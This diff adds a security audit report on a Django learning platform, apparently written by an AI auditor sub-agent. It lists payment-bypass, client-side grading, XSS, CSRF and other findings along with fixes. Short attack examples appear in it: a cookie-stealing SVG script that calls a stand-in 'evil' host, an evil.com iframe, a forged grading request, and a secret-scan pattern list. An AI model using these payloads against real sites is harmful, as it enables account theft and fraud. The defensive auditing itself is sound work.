@@ -1,0 +1,287 @@
+# Numeria Institute — Security Audit Worklog
+
+Task ID: 2
+Agent: security-auditor
+Date: 2025-06-20
+Scope: Full security audit of Django 6 / Channels 4 / Cloudinary / Railway-deployed educational platform at `/home/z/my-project/repos/numeria-institute`.
+
+---
+
+# Security Audit Report — Numeria Institute
+
+**Auditor:** security-auditor sub-agent
+**Codebase:** `numeria-institute` (Django 6.0.5, Channels 4.1, django-axes 8.3.1, django-ratelimit 4.1.0, Cloudinary, Resend email)
+**Deploy target:** Railway (4 uvicorn workers per `railway.json`)
+**Total findings:** 19 — 2 CRITICAL / 4 HIGH / 7 MEDIUM / 5 LOW / 1 INFO
+
+---
+
+## CRITICAL
+
+### C1. Payment bypass via "sandbox" provider exposed to all users
+
+- **Location:**
+  - `paiements/constants.py:1-8` — `'sandbox'` provider has `'disponible': True`
+  - `paiements/service.py:187-192` — `process_sandbox()` calls `confirmer_paiement(paiement, reference_provider='SANDBOX-TEST')` which marks the payment as `'reussi'` and creates the enrollment
+  - `paiements/views.py:143, 158` — `initier_paiement()` accepts user-supplied `provider` from POST and calls `traiter_paiement(paiement, provider)` with no server-side gate
+  - `paiements/templates/paiements/page_paiement.html:53-91` — renders the sandbox radio button as a selectable, available option to any authenticated user
+  - Same flaw replicated in `admissions/views.py:99-126` (`page_paiement_candidature`) and `mentorat/views.py:719-733` (`paiement_seance`)
+- **Description:** Every payment surface (course, formation, mentorat séance, admissions candidacy fee) lets the user pick the provider from a radio button list. The "sandbox" provider is hard-coded as `disponible: True` and on selection immediately marks the payment as `reussi` and grants access — no real money movement, no server-side whitelist, no environment gate. The user controls `provider` directly through `request.POST.get('provider')`. There is no check that `provider == 'sandbox'` is only allowed when `settings.DEBUG` is True or in a staging environment.
+- **Impact:** Any registered user can enroll in any paid course, paid formation, or mentorat séance, and pay candidacy fees, **without paying any money**. Direct revenue loss; the entire monetisation layer is bypassable in production. Mentorat sessions confirmed via sandbox also trigger the escrow release after 48h (`PaiementSeance.confirmer()` in `mentorat/views.py:733`), so mentors would be "paid" for sessions that were never actually paid for.
+- **Recommendation:**
+  1. Gate `process_sandbox` behind `if not settings.DEBUG: raise NotImplementedError("Sandbox disabled in production")`.
+  2. Remove `'sandbox'` from `PAYMENT_PROVIDERS` entirely, or set `disponible: False` controlled by `settings.DEBUG`.
+  3. Reject `provider == 'sandbox'` server-side in `initier_paiement`, `initier_paiement_formation`, `paiement_seance`, `page_paiement_candidature` unless `settings.DEBUG` is True.
+  4. Never trust client-supplied `provider` for free confirmation — derive it from a server-side allowlist.
+
+### C2. Client-side grading trusted for code exercises (point / grade manipulation)
+
+- **Location:** `cours/views.py:420-484` (`submit_code_exercise`)
+- **Description:** The endpoint receives a JSON body containing `is_correct: bool(body.get('is_correct', False))` from the client (Pyodide runs in the browser). If `is_correct` is True and the student hasn't already solved the exercise, the server awards the full `exercise.points` to the student, sets `StudentProgress.is_solved = True`, fires `notify_exercise_solved`, and records an `ExerciseAttempt` — all based purely on the client's self-reported correctness flag. There is no server-side execution of the student's code, no comparison of `output` against `expected_output`, and no signature on the result.
+- **Impact:** Any logged-in student can mark every code exercise as solved with a single crafted POST (`{"code": "", "is_correct": true, "attempt_number": 1}`), earning full points and inflating their grade / progress / certificate eligibility. This compromises the academic integrity of the platform and devalues every certificate issued by Numeria.
+- **Recommendation:**
+  1. Run code evaluation server-side (e.g. via a sandboxed container / restricted Python interpreter) and compute `is_correct` from `expected_output` / `test_code` server-side.
+  2. If Pyodide must run client-side, sign the result with an HMAC keyed by a server secret and verified server-side (similar to `mentorat/anti_fraude.py` `ValidateurPaiement.generer_signature`).
+  3. At minimum, ignore `body.get('is_correct')` and require server-side test execution before awarding points.
+
+---
+
+## HIGH
+
+### H1. WebRTC consumer uses in-process state + InMemoryChannelLayer → broken & unsafe with 4 Railway workers
+
+- **Location:**
+  - `numeria_project/settings.py:107-111` — `CHANNEL_LAYERS.default.BACKEND = channels.layers.InMemoryChannelLayer`
+  - `visioconference/consumers.py:13-16` — `MeetingConsumer` stores `room_participants`, `room_peer_channels`, `channel_peer_map`, `room_waiting_requests` as **class-level dicts**
+  - `railway.json:7` — `--workers 4` (four uvicorn workers per the deploy command)
+- **Description:** `InMemoryChannelLayer` only delivers messages between channels living in the same Python process. With 4 workers, WebSocket connections are load-balanced randomly across 4 processes, each with its own `MeetingConsumer` class-level dicts. `send_to_peer()` (consumers.py:314-318) calls `self.channel_layer.send(channel_name, ...)` — this silently no-ops if the target channel lives in another worker. Likewise `room_participants` only ever contains the participants that landed on this worker.
+- **Impact:**
+  - **Correctness:** In any meeting with >2 participants across workers, WebRTC `offer`/`answer`/`ice_candidate` signalling will be dropped → peers can't connect → meetings break. The waiting-room admit/reject flow also breaks: a host on worker A cannot admit a participant whose socket is on worker B.
+  - **Security:** The host-authorization checks (`if room.host_id != self.user.id: return`) only work for actions routed through the host's own worker. A participant whose socket lands on a different worker from the host can send `mute_all`, `end_meeting`, `admit_participant`, `reject_participant` messages; the host-gate runs locally and the broadcast goes out to that worker's subset of participants — partial DoS / meeting disruption. The `mark_participant_left` DB write is the only cross-worker signal, but the in-process `room_participants` is never reconciled with the DB.
+- **Recommendation:**
+  1. Switch to `channels_redis.core.RedisChannelLayer` (`CHANNEL_LAYERS = {'default': {'BACKEND': 'channels_redis.core.RedisChannelLayer', 'CONFIG': {'hosts': [os.environ['REDIS_URL']]}}}`).
+  2. Move all in-process dicts to either the DB (already partially done via `MeetingParticipant`) or a Redis hash. Never store participant state on the consumer class — `MeetingConsumer.room_participants` etc. must be deleted.
+  3. Add a Redis-backed group for `room_{code}` and broadcast every state change through `group_send` (already partially done via `broadcast()`).
+
+### H2. Sandbox provider accepted on mentorat séance payment + unconditional `confirmer()` call
+
+- **Location:** `mentorat/views.py:719-733`
+- **Description:** In `paiement_seance`, the flow is:
+  ```python
+  paiement, nouveau = creer_paiement(etudiant=request.user, paiement_seance=paiement_seance, provider=provider)
+  paiement_seance.lier_paiement(paiement)
+  if paiement.statut != 'reussi':
+      traiter_paiement(paiement, provider)
+  paiement_seance.confirmer()  # ← unconditional
+  ```
+  `paiement_seance.confirmer()` (mentorat/models.py:645-649) sets `statut = 'confirme'` with no check that `paiement.statut == 'reussi'`. So even if `traiter_paiement` partially fails (e.g. a future provider returns an unknown status), or if sandbox is selected, the seance is marked `confirme` and the 48h escrow timer starts ticking toward paying the mentor.
+- **Impact:** Compounds C1: any mentee can mark a paid seance as confirmed for free, and after 48h Numeria is on the hook to pay the mentor money that was never collected. Also, the unconditional `confirmer()` is a latent bug for any future real provider that returns an "en_cours" state.
+- **Recommendation:** `paiement_seance.confirmer()` must refuse to run unless `self.paiement and self.paiement.statut == 'reussi'`. Replace the unconditional call with `if paiement.statut == 'reussi': paiement_seance.confirmer()` and surface an error otherwise. Remove sandbox from production (see C1).
+
+### H3. Lesson content bleach allowlist includes `<iframe>` and global `style` attribute → stored XSS
+
+- **Location:** `cours/templatetags/content_filters.py:14-32, 78-79`
+- **Description:** The `render_content` filter (used on every lesson block of type `text` and via `render_markdown_latex` on legacy lesson content) calls `bleach.clean(html, tags=ALLOWED_TAGS, attributes=ALLOWED_ATTRS, strip=False)` and then `mark_safe(html)`. `ALLOWED_TAGS` includes `'iframe'` and `ALLOWED_ATTRS['iframe'] = ['src', 'width', 'height', 'frameborder', 'allowfullscreen', 'allow']` — so a staff-authored (or compromised-staff) lesson can embed an arbitrary `<iframe src="https://evil.com">` and it will be rendered unsanitized to every enrolled student. Worse, `ALLOWED_ATTRS['*'] = ['class', 'id', 'style']` allows inline CSS on every tag, enabling CSS-based exfiltration (`background:url(https://attacker/...)`) and UI-redressing via `position:fixed` overlays.
+- **Impact:** Stored XSS to every student viewing the lesson. Compromised staff account (or a CSRF in the admin panel) can pivot to mass student account takeover via session-cookie theft. The `iframe` allowlist additionally enables phishing: a fake login form embedded in a lesson.
+- **Recommendation:**
+  1. Remove `'iframe'` from `ALLOWED_TAGS`. If lesson embedding is needed, use a dedicated `[YOUTUBE id=...]`-style marker that's expanded to a hardcoded `<iframe src="https://www.youtube-nocookie.com/embed/{id}">` template.
+  2. Remove `'style'` from the global `'*'` attribute list. Allow only specific class names via a CSS allowlist if styling is needed.
+  3. Pass `protocols=bleach.sanitizer.ALLOWED_PROTOCOLS` (http, https, mailto) explicitly to scrub `javascript:` URLs.
+  4. Add a Content-Security-Policy header (see M5) as defense-in-depth.
+
+### H4. Verification email link auto-logs the user in — token replay = account takeover
+
+- **Location:** `comptes/views.py:61-72` (`verify_email`) and `numeria_project/emails.py:69-78`
+- **Description:** The email verification token is `signing.dumps({'user_id': user.pk}, salt=EMAIL_VERIFICATION_SALT)` with `max_age=24h`. On click, `verify_email` activates the user AND immediately calls `login(request, user, backend='django.contrib.auth.backends.ModelBackend')` — no password check, no session rotation, no rate limit on the endpoint. Anyone who obtains the verification URL (e.g. email forwarded to a shared inbox, mail provider scanning, mail logs, browser history on a shared computer) gets a fully authenticated session for that user for up to 24h after registration.
+- **Impact:** Account pre-hijack: an attacker who controls the victim's email at registration time (or who intercepts the verification email) gets a passwordless login to the new account. Combined with the fact that registration rate-limit is only 10/h/IP, an attacker can spam-register victims and use their verification links.
+- **Recommendation:**
+  1. Drop the auto-login. After verification, redirect to the login page with a success flash message.
+  2. Add `@ratelimit(key='ip', rate='20/h', block=True)` on `verify_email` to bound brute-force attempts (signing makes this infeasible today, but cheap defense).
+  3. Bind the token to a per-user nonce stored in the DB so a re-issued token invalidates the previous one.
+  4. Reduce `EMAIL_VERIFICATION_MAX_AGE` to 1h.
+
+---
+
+## MEDIUM
+
+### M1. `gerer_demande` accepts state-changing action via GET (CSRF)
+
+- **Location:** `mentorat/views.py:508-547`, `mentorat/urls.py:21` (`path('demande/<int:demande_pk>/<str:action>/', views.gerer_demande, ...)`)
+- **Description:** `gerer_demande` accepts the URL-path parameter `action` (one of `accepter`/`refuser`) and immediately calls `demande.accepter()` or `demande.refuser()` — no `if request.method == 'POST':` guard, no CSRF token check (Django CSRF middleware only validates POST/PUT/PATCH/DELETE). Any logged-in mentor who is tricked into loading `<img src="https://numeria.app/mentorat/demande/42/accepter/">` will silently accept the demand.
+- **Impact:** CSRF on mentorship request acceptance / refusal. A malicious page can cause a mentor to auto-accept any demand whose PK it can enumerate.
+- **Recommendation:**
+  1. Change the URL to require POST: `path('demande/<int:demande_pk>/action/', views.gerer_demande, ...)` and read `action` from `request.POST`.
+  2. Add `if request.method != 'POST': return HttpResponseNotAllowed(['POST'])` at the top.
+  3. Same audit for `terminer_relation` (mentorat/views.py:663) which has a POST guard but also accepts GET to render the confirmation template — that's OK, but make sure no state change happens on GET.
+
+### M2. `resend_verification_email` has no rate limit — email bombing
+
+- **Location:** `comptes/views.py:75-90`, `comptes/urls.py:11`
+- **Description:** Unlike `inscription`, `connexion`, `password-reset` (all rate-limited), `resend_verification_email` has no `@ratelimit` decorator. An attacker can POST any email address repeatedly; if a matching inactive account exists, a verification email is sent each time.
+- **Impact:** Email bombing of inactive users' inboxes; potential Resend API cost abuse; potential to trigger spam complaints against Numeria's sending domain.
+- **Recommendation:** Add `@ratelimit(key='ip', rate='3/h', method='POST', block=True)` and also rate-limit per-target-email (use `key='post:email'`).
+
+### M3. Account deletion cascades to `Paiement` rows — destroys financial audit trail
+
+- **Location:** `comptes/views.py:282-294` (`supprimer_compte`) + `paiements/models.py:48` (`etudiant = ForeignKey(User, on_delete=CASCADE)`)
+- **Description:** `request.user.delete()` cascades through every model with `on_delete=CASCADE` to the user. `Paiement.etudiant` is CASCADE, so every payment record (reference, amount, provider, IP, user-agent, date) is **destroyed** when a user self-deletes. Same for `StudentProgress`, `ExerciseAttempt`, `InscriptionCours`, `InscriptionFormation`, `Candidature`, `DemandeMentorat`, `RelationMentorat`, `MeetingRoom`, `ChatMessage`, `Sujet`, `Message` — but those are appropriately GDPR-removable. Payment records are not.
+- **Impact:** Loss of financial / tax / dispute audit trail. If a chargeback or fraud investigation occurs after the user has self-deleted, Numeria has no internal record of the transaction. This violates accounting retention requirements in most jurisdictions (e.g. OHADA in francophone Africa requires 10 years).
+- **Recommendation:**
+  1. Change `Paiement.etudiant` to `on_delete=models.SET_NULL, null=True` and add an immutable `etudiant_email_snapshot = models.EmailField()` + `etudiant_username_snapshot` captured at payment creation, so the record survives account deletion.
+  2. Same for `RemboursementDemande` and `PaiementSeance` (the latter is linked through `Paiement`).
+  3. Add a `User.deleted_at` soft-delete flag instead of hard `user.delete()`; replace `supprimer_compte` with anonymization (set `email = f"deleted+{uuid}@invalid"`, `first_name=''`, `last_name=''`, `is_active=False`, `password=UNUSABLE_PASSWORD`) and keep audit-trail FKs.
+
+### M4. Profile photo upload has no server-side type / size validation
+
+- **Location:** `comptes/models.py:18-23` (`photo = CloudinaryField('photo', blank=True, null=True, folder='photos_profil/')`) and `comptes/forms.py:194-199` (only `accept='image/*'` client-side attribute)
+- **Description:** The `FormulaireProfil.photo` field has no `FileExtensionValidator`, no `validate_image` validator, no `max_upload_size` check. The HTML `accept='image/*'` is a UX hint only — trivially bypassed. While CloudinaryField will typically reject non-image uploads, **SVG** files are images and Cloudinary stores them as-is; an SVG containing `<script>` will be served inline and execute in the user's browser when the profile photo is viewed via the Cloudinary URL. `DATA_UPLOAD_MAX_MEMORY_SIZE = 3MB` (settings.py:141) bounds the size, but that's a process-wide limit, not a per-field image-size limit.
+- **Impact:** Stored XSS via profile photo SVG. A user uploads an SVG containing `<script>fetch('//evil/'+document.cookie)</script>`; any page rendering `<img src="{{ profil.photo.url }}">` doesn't execute it (img tags don't run scripts), but anyone clicking the photo URL directly (e.g. "open image in new tab") executes the payload in the numeria.app origin.
+- **Recommendation:**
+  1. Add `validators=[FileExtensionValidator(['jpg','jpeg','png','webp'])]` to `Profil.photo` (explicitly exclude `svg` and `gif` if animation isn't required).
+  2. Add a `validate_image_size(value)` validator (e.g. 2 MB max) like the one in `admissions/models.py:10-14`.
+  3. Configure Cloudinary `resource_type='image'` with `format='jpg'` to force rasterization on upload.
+  4. Serve all user-uploaded images with `Content-Security-Policy: script-src 'self'` and `X-Content-Type-Options: nosniff`.
+
+### M5. No CSP, no CORS, no Permissions-Policy headers
+
+- **Location:** `numeria_project/settings.py` (entire file — no `CSP_*`, `CORS_*`, `PERMISSIONS_POLICY` settings)
+- **Description:** The settings file configures HSTS, X-Frame-Options=DENY, SECURE_CONTENT_TYPE_NOSNIFF, SECURE_REFERRER_POLICY — good. But there is no Content-Security-Policy (so inline scripts, arbitrary origins, `eval`, `data:` URIs are all allowed), no CORS configuration (every response is permissive by default since no `Access-Control-Allow-Origin` is set — actually that's safe-by-default for same-origin), and no Permissions-Policy (camera/mic/geolocation available to any page including injected iframes).
+- **Impact:** Without CSP, any XSS that slips through (H3, M4) immediately becomes a full account takeover — exfiltrating the session cookie to an attacker origin is trivial. No Permissions-Policy means a malicious iframe can request camera/mic access.
+- **Recommendation:**
+  1. Install `django-csp` and add a strict policy: `CONTENT_SECURITY_POLICY = {'default-src': ["'self'"], 'script-src': ["'self'", "'nonce-...'"], 'style-src': ["'self'", 'cdn.tailwindcss.com'], 'img-src': ["'self'", 'data:', 'res.cloudinary.com'], 'media-src': ["'self'", 'res.cloudinary.com'], 'frame-src': ['www.youtube-nocookie.com', 'player.vimeo.com'], 'connect-src': ["'self'"], 'object-src': ["'none'"], 'base-uri': ["'none'"], 'frame-ancestors': ["'none'"]}`.
+  2. Add `PERMISSIONS_POLICY = {'camera': '(self)', 'microphone': '(self)', 'geolocation': '()', 'interest-cohort': '()'}`.
+  3. Add `SECURE_CROSS_ORIGIN_OPENER_POLICY = 'same-origin'` and `SECURE_CROSS_ORIGIN_EMBEDDER_POLICY = 'credentialless'` (Django 6 supports these).
+
+### M6. Staff authored `text_content` rendered with `|safe` in admin preview → admin-to-admin XSS
+
+- **Location:**
+  - `templates/admin_panel/blocks/block_preview.html:7` — `{{ block.text_content|safe }}`
+  - `templates/admin_panel/blocks/block_preview.html:34` — `{{ block.exercise.instructions|safe }}`
+  - `templates/admin_panel/cours_preview.html:58` — `{{ block.content|safe }}` (dead code — `content` key doesn't exist in the dict from `build_block_previews`, but a maintenance hazard if the field is renamed)
+- **Description:** Lesson block `text_content` and exercise `instructions` are raw `TextField`s authored by staff and rendered with `|safe` (no bleach, no markdown). A staff user (or attacker who CSRF'd a staff session) can input `<script>...</script>` and have it execute in another staff member's browser on the preview page. The `cours/templates/cours/detail.html:286, 377, 485, 736` lines also use `|safe` on `lecon_active.contenu`, `exercice.question`, `exercice.corrige`, `question.reponse` — these render to students if reached, but the legacy code paths are largely stubbed out (see `cours/views.py:324-330`).
+- **Impact:** Stored XSS among staff. If a low-privilege staff user (or an attacker with a CSRF on `ajax_lecon_save`) injects malicious content into `text_content`, every staff member who opens the preview executes the script — escalation to full admin compromise.
+- **Recommendation:**
+  1. Pipe all `text_content` / `instructions` through the `render_content` filter from `content_filters.py` instead of `|safe`. This applies bleach sanitization.
+  2. Audit every `|safe` occurrence (8 templates found) and confirm each one renders either server-built JSON (`json.dumps` output) or genuinely trusted content. Replace `{{ block.content|safe }}` and `{{ lecon.contenu_html|safe }}` (formation/voir_lecon.html:66 — field doesn't exist on the model) with the `render_content` filter.
+
+### M7. Admin login partially exposed by `AXES_ENABLE_ADMIN=False` + admin URL discoverable
+
+- **Location:** `numeria_project/settings.py:260` (`AXES_ENABLE_ADMIN=False`), `numeria_project/urls.py:62` (`path('numeria-staff-portal/', admin.site.urls)`)
+- **Description:** Two related issues:
+  1. `AXES_ENABLE_ADMIN = False` disables the Axes lockout **admin panel** (the page that lists lockouts). It does **not** disable brute-force protection for the admin login (axes still applies). However, the comment in settings (`# keep admin unaffected`) suggests the author may have intended to disable axes for admin — verify intent.
+  2. The admin URL `/numeria-staff-portal/` is a hardcoded, low-entropy string committed to the repo. Security-through-obscurity is weak; the URL is in `.git`, in `pages/views.py:96` (`Disallow: /admin/` but NOT `/numeria-staff-portal/`), and in `urls.py`.
+- **Impact:** Admin login is reachable by anyone who reads the source (or just guesses common staff-portal paths). With `AXES_FAILURE_LIMIT=5` and `AXES_COOLOFF_TIME=1h`, brute-force is throttled but not prevented — a distributed attacker can still try 5 passwords per hour per IP.
+- **Recommendation:**
+  1. Move the admin URL to an environment-variable-controlled path: `path(os.environ.get('ADMIN_URL_PATH', 'numeria-staff-portal') + '/', admin.site.urls)`.
+  2. Add `Disallow: /numeria-staff-portal/` (or the env-controlled path) to `robots_txt` in `pages/views.py:90-100`.
+  3. Enable 2FA on staff accounts via `django-otp` (or at minimum on superusers).
+  4. Add `django-axes` IP allowlist for the admin path (`AXES_ONLY_ADMIN_FAILURES=True` if you want axes to only protect admin).
+
+---
+
+## LOW
+
+### L1. f-string SQL in migrations (no runtime risk, but bad pattern)
+
+- **Location:**
+  - `cours/migrations/0002_rename_fields.py:17, 32, 36` — `cursor.execute(f"PRAGMA table_info({table_name})")`, `cursor.execute(f"ALTER TABLE {table} RENAME COLUMN {old_name} TO {new_name}")`, `cursor.execute(f"ALTER TABLE {table} ADD COLUMN {column_sql}")`
+  - `cours/migrations/0003_fix_exercise_schema.py:32, 35, 43` — same pattern
+  - `formation/migrations/0002_recreate_tables.py:37` — `cursor.execute(f"DROP TABLE IF EXISTS {table_name}{cascade};")`
+- **Description:** Table and column names are interpolated via f-strings into SQL. All values are hardcoded string literals (no user input), so this is not exploitable. But the pattern is unsafe if ever copy-pasted into runtime code, and Django's schema editor provides `quote_value` for safe identifier quoting which should be used instead.
+- **Impact:** None in production (migrations run once at deploy, no user input). Maintenance hazard / pattern-propagation risk.
+- **Recommendation:** Use `schema_editor.quote_name(table_name)` and `connection.ops.quote_name(name)` for identifier interpolation, or replace with `migrations.RenameField` / `migrations.AlterField` operations declared in `state_operations`.
+
+### L2. `DEBUG=False` cookie-secure flags are environment-coupled
+
+- **Location:** `numeria_project/settings.py:295-296`
+  ```python
+  SESSION_COOKIE_SECURE    = not DEBUG
+  CSRF_COOKIE_SECURE       = not DEBUG
+  ```
+- **Description:** Cookie security is tied to `DEBUG` rather than to an explicit "is production" flag. If someone deploys with `DEBUG=True` (e.g. a staging environment that runs against the production DB, or a misconfigured Railway env var), cookies become `Secure=False` and can be sent over HTTP — interceptable on the wire.
+- **Impact:** Low — current production deploy uses `DEBUG=False`. But fragile: any future staging/preview environment inherits insecure cookies.
+- **Recommendation:** Decouple: `SESSION_COOKIE_SECURE = config('SESSION_COOKIE_SECURE', default=not DEBUG, cast=bool)`. Same for `CSRF_COOKIE_SECURE`. Add a system check that errors if `DEBUG=True` AND `ALLOWED_HOSTS` contains a public hostname.
+
+### L3. `SECURE_SSL_REDIRECT=False` relies entirely on Railway edge TLS
+
+- **Location:** `numeria_project/settings.py:286-287, 299`
+- **Description:** SSL redirect is explicitly disabled (silencing `security.W008`). The comment says "Railway terminates TLS at the edge — never redirect here (would loop)." This is correct for the Railway deploy topology, BUT: if the app is ever moved to a deployment that doesn't terminate TLS upstream (or if Railway changes its proxy behavior), HTTP requests will be served without redirect.
+- **Impact:** Low for current Railway deploy. Higher if infrastructure changes.
+- **Recommendation:** Add a deploy-time assertion / system check that verifies `HTTP_X_FORWARDED_PROTO` is being set by the proxy (Railway always sets it), and document the assumption in `EMAIL_SETUP.md` or a new `DEPLOY.md`. Alternatively, use `SECURE_SSL_REDIRECT = config('SECURE_SSL_REDIRECT', default=False, cast=bool)` so it can be flipped without code change.
+
+### L4. `print(formulaire.errors)` debug code left in production view
+
+- **Location:** `comptes/views.py:215`
+- **Description:** In `modifier_profil`, if the form is invalid and the user is a superuser, the form errors are `print()`-ed to stdout (which Railway captures as log output). Form errors may contain submitted values (e.g. "GitHub: Enter a valid URL." with the value echoed) — minor info leak into logs.
+- **Impact:** Minimal — only triggers for superusers, only on form errors. But pollutes logs and is a code smell.
+- **Recommendation:** Replace with `logger.debug('Profil form errors for %s: %s', request.user.pk, formulaire.errors)` (or remove entirely).
+
+### L5. `join_room` and `lobby` views allow anonymous access (by design, but unverified password policy)
+
+- **Location:** `visioconference/views.py:38-68` (`join_room`, `lobby`)
+- **Description:** `join_room` is not decorated with `@login_required` and accepts a room_code + password from anyone. `lobby` is also open. Anonymous users can enumerate room codes (9-char codes from a 32-char alphabet = ~1e13 entropy, so brute-force is infeasible) but can also guess weak passwords. `MeetingRoom.password` is a plain `CharField(max_length=128)` with no hashing — passwords are stored in clear text and compared with `room.password != password` (visioconference/views.py:47).
+- **Impact:** Low (room codes have high entropy). But if a user creates a meeting with a weak password (e.g. "1234"), anyone who learns the room code can join. The clear-text storage means a DB dump leaks all meeting passwords.
+- **Recommendation:**
+  1. Hash `MeetingRoom.password` with `make_password` on save and verify with `check_password`.
+  2. Enforce minimum password complexity at the `create_room` form layer.
+  3. Optionally require `@login_required` on `join_room` (currently anyone with the link can attempt to join — this is a product decision).
+
+---
+
+## INFO
+
+### I1. General positive findings (no action required)
+
+- **Auth backends & rate-limiting:** `axes.backends.AxesStandaloneBackend` is first in `AUTHENTICATION_BACKENDS` (settings.py:250-253). `AXES_FAILURE_LIMIT=5`, `AXES_COOLOFF_TIME=1h`, `AXES_RESET_ON_SUCCESS=True`. Login, registration, password-reset, and contact form all have `@ratelimit` decorators (`comptes/views.py:29, 36, 93` and `pages/views.py:160`).
+- **`@staff_only` decorator coverage:** Every view in `admin_panel/views.py` and the four sub-modules (`views_cours`, `views_blog`, `views_media`, `views_formation`, `views_blocks`) is decorated with `@staff_only`. Every state-changing endpoint additionally has `@require_POST`. No missing-auth findings in admin_panel. (Audit method: grep for `^(def|class)` vs `@staff_only` — counts match.)
+- **`@login_required` coverage on cours exercise endpoints:** All `submit_*` endpoints are `@login_required @require_POST`. `submit_mcq` validates that submitted choice IDs belong to the exercise (`cours/views.py:527-529`). MCQ evaluation is server-side. Good.
+- **Email token signing:** `numeria_project/emails.py:69-78` uses `django.core.signing.dumps` with a salt and `max_age=24h`. Tokens are HMAC-signed with `SECRET_KEY` and not forgeable.
+- **Contact reply CRLF stripping:** `admin_panel/views.py:123` does `subject.replace('\n', ' ').replace('\r', ' ')` and `validate_email(to_field)` — prevents header injection in outbound emails.
+- **`.gitignore` correctly excludes `.env`, `*.sqlite3`, `media/`.**
+- **No hardcoded secrets found.** Scanned for `ghp_`, `sk_live_`, `sk_test_`, `AKIA`, `xoxb-`, `glpat-`, JWT patterns, `SECRET_KEY=...`, `PASSWORD=...`, `API_KEY=...` in all `.py`, `.html`, `.json`, `.md`, `.txt` files (excluding `staticfiles/`, `locale/`, `messages.mo`). No matches. `.env.example` contains only placeholders. Cloudinary URL parsing in settings.py is correct.
+- **`SECURE_HSTS_SECONDS=31536000` with `INCLUDE_SUBDOMAINS=True` and `PRELOAD=True`** — properly preloaded HSTS.
+- **`X_FRAME_OPTIONS='DENY'`** — clickjacking protected.
+- **`CSRF_TRUSTED_ORIGINS`** is set to the production Railway URL.
+- **No `@csrf_exempt`** anywhere in the codebase.
+- **No `eval()` / `exec()` / `pickle.loads()` / `os.system()` / `shell=True`** in app code. The only `subprocess` use is `git rev-parse` in `numeria_project/context_processors.py:17` with a hardcoded argv list (no shell).
+- **No `extra()` or `.raw()` ORM calls.** The only raw SQL is in three migration files (L1) with hardcoded identifiers.
+
+---
+
+## Summary table
+
+| ID | Severity | Title | Primary location |
+|----|----------|-------|------------------|
+| C1 | CRITICAL | Sandbox payment provider exposed to all users → free courses/formations/mentorat | `paiements/constants.py:1-8`, `paiements/service.py:187-192`, `paiements/views.py:143` |
+| C2 | CRITICAL | Code-exercise grading trusts client-supplied `is_correct` | `cours/views.py:420-484` |
+| H1 | HIGH | InMemoryChannelLayer + class-level state + 4 workers → broken & unsafe WebRTC | `settings.py:107-111`, `visioconference/consumers.py:13-16`, `railway.json:7` |
+| H2 | HIGH | `paiement_seance.confirmer()` called unconditionally; sandbox compounds | `mentorat/views.py:719-733`, `mentorat/models.py:645-649` |
+| H3 | HIGH | bleach allowlist includes `<iframe>` + global `style` → stored XSS | `cours/templatetags/content_filters.py:14-32` |
+| H4 | HIGH | Verification URL auto-logs in user → token replay = account takeover | `comptes/views.py:61-72` |
+| M1 | MEDIUM | `gerer_demande` mutates state on GET (CSRF) | `mentorat/views.py:508-547` |
+| M2 | MEDIUM | `resend_verification_email` not rate-limited → email bombing | `comptes/views.py:75-90` |
+| M3 | MEDIUM | Account deletion cascades to `Paiement` rows → destroys audit trail | `comptes/views.py:282-294`, `paiements/models.py:48` |
+| M4 | MEDIUM | Profile photo upload has no server-side type/size validation (SVG XSS) | `comptes/models.py:18-23`, `comptes/forms.py:194-199` |
+| M5 | MEDIUM | No CSP, no Permissions-Policy headers | `numeria_project/settings.py` |
+| M6 | MEDIUM | Staff-authored `text_content` rendered with `|safe` → admin XSS | `templates/admin_panel/blocks/block_preview.html:7,34` |
+| M7 | MEDIUM | Admin URL is hardcoded + `AXES_ENABLE_ADMIN=False` ambiguous | `settings.py:260`, `urls.py:62` |
+| L1 | LOW | f-string SQL in migrations (no runtime risk) | `cours/migrations/0002_rename_fields.py`, `formation/migrations/0002_recreate_tables.py` |
+| L2 | LOW | Cookie-secure flags coupled to DEBUG | `settings.py:295-296` |
+| L3 | LOW | `SECURE_SSL_REDIRECT=False` relies on Railway edge TLS | `settings.py:286-287` |
+| L4 | LOW | `print(formulaire.errors)` debug code in prod view | `comptes/views.py:215` |
+| L5 | LOW | Visioconference room passwords stored in clear text | `visioconference/models.py:20`, `visioconference/views.py:47` |
+| I1 | INFO | Positive findings (axes, rate-limits, no secrets, no eval, etc.) | — |
+
+---
+
+## Recommended remediation order
+
+1. **C1 + H2** (same fix) — disable sandbox in production, audit all `provider` flows.
+2. **C2** — server-side grading (largest effort, biggest integrity win).
+3. **H1** — switch to Redis channel layer (also fixes mentorat WebSocket if any).
+4. **H3 + M6 + M4** — tighten bleach allowlist, route all `|safe` content through `render_content`, add CSP (M5).
+5. **H4 + M2** — drop auto-login on verify, rate-limit resend.
+6. **M1** — POST-only `gerer_demande`.
+7. **M3** — retain payment records on user deletion.
+8. **M5 + M7** — CSP, admin URL via env var.
+9. **L1–L5** — backlog cleanups.
